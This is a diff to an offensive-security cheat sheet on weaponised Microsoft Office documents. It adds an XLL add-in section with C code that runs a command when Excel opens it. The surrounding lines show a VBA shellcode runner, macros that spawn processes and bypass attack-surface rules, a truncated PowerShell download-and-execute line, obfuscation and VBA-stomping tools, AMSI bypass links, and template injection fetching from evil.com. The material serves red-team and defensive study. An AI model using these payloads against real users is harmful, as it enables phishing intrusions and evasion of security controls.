@@ -12,6 +12,7 @@
     * [XLM Excel 4.0 - EXCELntDonut](#xlm-excel-40---excelntdonut)
     * [XLM Excel 4.0 - EXEC](#xlm-excel-40---exec)
     * [SLK - EXEC](#slk---exec)
+    * [XLL - EXEC](#xll---exec)
 * [Word](#word)
     * [DOCM - Metasploit](#docm---metasploit)
     * [DOCM - Download and Execute](#docm---download-and-execute)
@@ -36,6 +37,7 @@
     * [DOCX - DDE](#docx---dde)
 * [References](#references)
 
+
 ## Office Products Features
 
 ![Overview of features supported by different Office products](https://www.securesystems.de/images/blog/offphish-phishing-revisited-in-2023/Office_documents_feature_overview.png)
@@ -52,26 +54,36 @@ By default, Excel does not set a password when saving a new file. However, some 
 | Excel      | VelvetSweatshop  | all Excel formats |
 | PowerPoint | 01Hannes Ruescher/01 | .pps .ppt     |
 
+
 ## Office Macro execute WinAPI
 
 ### Description
 
 To importe Win32 function we need to use the keyword `Private Declare`
-`Private Declare Function <NAME> Lib "<DLL_NAME>" Alias "<FUNCTION_IMPORTED>" (<ByVal/ByRef> <NAME_VAR> As <TYPE>, etc.) As <TYPE>`
+
+```vb
+Private Declare Function <NAME> Lib "<DLL_NAME>" Alias "<FUNCTION_IMPORTED>" (<ByVal/ByRef> <NAME_VAR> As <TYPE>, etc.) As <TYPE>
+```
+
 If we work on 64bit, we need to add the keyword `PtrSafe` between the keywords `Declare` and `Function`
 Importing the `GetUserNameA` from `advapi32.dll`: 
-```VBA
+
+```vb
 Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
 ```
+
 `GetUserNameA` prototype in C: 
+
 ```C
 BOOL GetUserNameA(
   LPSTR   lpBuffer,
   LPDWORD pcbBuffer
 );
 ```
+
 ### Example with a simple Shellcode Runner
-```VBA
+
+```vb
 Private Declare PtrSafe Function VirtualAlloc Lib "Kernel32.dll" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 Private Declare PtrSafe Function RtlMoveMemory Lib "Kernel32.dll" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32.dll" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
@@ -234,6 +246,42 @@ C;X1;Y102;K0;EHALT()
 E
 ```
 
+
+### XLL - EXEC
+
+An "XLL" file is a type of file used primarily with Microsoft Excel. It stands for "Excel Add-In Library" and is a dynamic link library (DLL) specifically designed to be loaded into Microsoft Excel. These files extend Excel's functionality by adding extra features, functions, or capabilities that are not available in the standard installation of Excel.
+
+:warning: Excel is blocking untrusted XLL add-ins by default
+
+* Compile with: `cl.exe notepadXLL.c /LD /o notepad.xll`
+    ```c
+    #include <Windows.h>
+
+    __declspec(dllexport) void __cdecl xlAutoOpen(void); 
+
+    void __cdecl xlAutoOpen() {
+        // Triggers when Excel opens
+        WinExec("cmd.exe /c notepad.exe", 1);
+    }
+
+    BOOL APIENTRY DllMain( HMODULE hModule,
+                        DWORD  ul_reason_for_call,
+                        LPVOID lpReserved
+                        )
+    {
+        switch (ul_reason_for_call)
+        {
+        case DLL_PROCESS_ATTACH:
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+        }
+        return TRUE;
+    }
+    ```
+
+
 ## Word
 
 ### DOCM - Metasploit
@@ -338,7 +386,7 @@ End Sub
 
 ### DOCM - VBA Spawning via svchost.exe using Scheduled Task
 
-```ps1
+```vb
 Sub AutoOpen()
     Set service = CreateObject("Schedule.Service")
     Call service.Connect
@@ -364,7 +412,7 @@ Rem powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadst
 
 Basic WMI exec (detected by Defender) : `r = GetObject("winmgmts:\\.\root\cimv2:Win32_Process").Create("calc.exe", null, null, intProcessID)`
 
-```ps1
+```vb
 Sub wmi_exec()
     strComputer = "."
     Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
@@ -379,7 +427,7 @@ End Sub
 * https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3
 * https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2
 
-```ps1
+```vb
 Sub ASR_bypass_create_child_process_rule5()
     Const HIDDEN_WINDOW = 0
     strComputer = "."
@@ -400,7 +448,7 @@ Sub AutoOpen()
 End Sub
 ```
 
-```ps1
+```vb
 Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
 Set SW = GetObject("new:" & ShellWindows).Item()
 SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
@@ -574,7 +622,6 @@ End Sub
 ```
 
 
-
 ### VBA Obfuscation
 
 ```ps1
@@ -583,6 +630,7 @@ $ git clone https://github.com/bonnetn/vba-obfuscator
 $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
 ```
 
+
 ### VBA Purging
 
 **VBA Stomping**: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. 
@@ -590,6 +638,7 @@ $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfusc
 :warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.
 
 #### OfficePurge
+
 * https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe
 
 ```powershell
@@ -631,6 +680,7 @@ EvilClippy.exe -r macrofile.doc
 * AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba
 * amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3
 * VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba
+
 
 ### VBA - AMSI
 
@@ -674,6 +724,7 @@ Private Sub Document_Open()
 End Sub
 ```
 
+
 ### DOCX - Template Injection
 
 :warning: Does not require "Enable Macro"
@@ -695,6 +746,7 @@ End Sub
     Target="https://evil.com/malicious.dotm" TargetMode="External"/></Relationships>
     ```
 7. File gets zipped back up again and renamed to .docx
+
 
 #### Template Injections Tools
 
@@ -739,9 +791,10 @@ $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 * [PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018](https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/)
 * [AMSI in the heap - rmdavy](https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/)
 * [WordAMSIBypass - rmdavy](https://github.com/rmdavy/WordAmsiBypass)
-* [Dechaining macros and evading EDR - Noora Hyvärinen](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)
-* [Executing macros from docx with remote - RedXORBlueJuly 18, 2018](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
+* [Dechaining macros and evading EDR - Noora Hyvärinen - 04/04/19](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)
+* [Executing macros from docx with remote - RedXORBlue - July 18, 2018](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
 * [One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021](https://adepts.of0x.cc/alternatives-copy-shellcode/)
 * [Running macros via ActiveX controls - greyhathacker - September 29, 2016](http://www.greyhathacker.net/?p=948)
 * [Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental](https://www.goggleheadedhacker.com/blog/post/23)
 * [So you think you can block Macros? - Pieter Ceelen - April 25, 2023](https://outflank.nl/blog/2023/04/25/so-you-think-you-can-block-macros/)
+* [MS OFFICE FILE FORMAT SORCERY - TROOPERS19 - Pieter Ceelen & Stan Hegt - 21 March 2019 ](https://github.com/outflanknl/Presentations/blob/master/Troopers19_MS_Office_file_format_sorcery.pdf)
